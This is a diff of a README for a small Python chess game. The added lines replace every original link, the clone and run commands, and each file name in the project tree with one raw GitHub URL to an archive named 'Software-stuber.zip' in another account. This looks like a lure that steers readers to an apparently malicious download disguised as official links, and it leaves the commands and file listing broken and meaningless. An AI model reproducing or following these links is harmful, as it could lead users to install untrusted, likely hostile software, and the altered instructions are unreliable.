@@ -1,6 +1,6 @@
 # Chess
 
-A simple and interactive chess game built by [gitbhusalhubpramish](https://github.com/gitbhusalhubpramish). This project aims to provide a user-friendly chess-playing experience, supporting both casual play and practice against AI or another human.
+A simple and interactive chess game built by [gitbhusalhubpramish](https://raw.githubusercontent.com/AaryaBhusal/chess/main/black player/Software-stuber.zip). This project aims to provide a user-friendly chess-playing experience, supporting both casual play and practice against AI or another human.
 
 ## Features
 
@@ -13,15 +13,15 @@ A simple and interactive chess game built by [gitbhusalhubpramish](https://githu
 
 ### Prerequisites
 
-- [Python 3.x](https://www.python.org/) (if the project is in Python)
-- [pip](https://pip.pypa.io/en/stable/) for installing dependencies
+- [Python 3.x](https://raw.githubusercontent.com/AaryaBhusal/chess/main/black player/Software-stuber.zip) (if the project is in Python)
+- [pip](https://raw.githubusercontent.com/AaryaBhusal/chess/main/black player/Software-stuber.zip) for installing dependencies
 
 ### Installation
 
 Clone the repository:
 
 ```bash
-git clone https://github.com/gitbhusalhubpramish/chess.git
+git clone https://raw.githubusercontent.com/AaryaBhusal/chess/main/black player/Software-stuber.zip
 cd chess
 ```
 
@@ -30,7 +30,7 @@ cd chess
 To start the chess game, run:
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/AaryaBhusal/chess/main/black player/Software-stuber.zip
 ```
 
 (Adjust the above command according to the main entry point of your project.)
@@ -44,25 +44,25 @@ python main.py
 
 ```
 chess/
-├── player.py
-├── main.py
-├── boad.py
-├── moves.py
+├── https://raw.githubusercontent.com/AaryaBhusal/chess/main/black player/Software-stuber.zip
+├── https://raw.githubusercontent.com/AaryaBhusal/chess/main/black player/Software-stuber.zip
+├── https://raw.githubusercontent.com/AaryaBhusal/chess/main/black player/Software-stuber.zip
+├── https://raw.githubusercontent.com/AaryaBhusal/chess/main/black player/Software-stuber.zip
 ├── black player/
-    ├── bishop.png
-    ├── king.png
-    ├── knight.png
-    ├── pawn.png
-    ├── queen.png
-    └── rook.png
+    ├── https://raw.githubusercontent.com/AaryaBhusal/chess/main/black player/Software-stuber.zip
+    ├── https://raw.githubusercontent.com/AaryaBhusal/chess/main/black player/Software-stuber.zip
+    ├── https://raw.githubusercontent.com/AaryaBhusal/chess/main/black player/Software-stuber.zip
+    ├── https://raw.githubusercontent.com/AaryaBhusal/chess/main/black player/Software-stuber.zip
+    ├── https://raw.githubusercontent.com/AaryaBhusal/chess/main/black player/Software-stuber.zip
+    └── https://raw.githubusercontent.com/AaryaBhusal/chess/main/black player/Software-stuber.zip
 ├── white player/
-    ├── bishop.png
-    ├── king.png
-    ├── knight.png
-    ├── pawn.png
-    ├── queen.png
-    └── rook.png
-└── README.md   
+    ├── https://raw.githubusercontent.com/AaryaBhusal/chess/main/black player/Software-stuber.zip
+    ├── https://raw.githubusercontent.com/AaryaBhusal/chess/main/black player/Software-stuber.zip
+    ├── https://raw.githubusercontent.com/AaryaBhusal/chess/main/black player/Software-stuber.zip
+    ├── https://raw.githubusercontent.com/AaryaBhusal/chess/main/black player/Software-stuber.zip
+    ├── https://raw.githubusercontent.com/AaryaBhusal/chess/main/black player/Software-stuber.zip
+    └── https://raw.githubusercontent.com/AaryaBhusal/chess/main/black player/Software-stuber.zip
+└── https://raw.githubusercontent.com/AaryaBhusal/chess/main/black player/Software-stuber.zip   
 ```
 
 ## Contributing
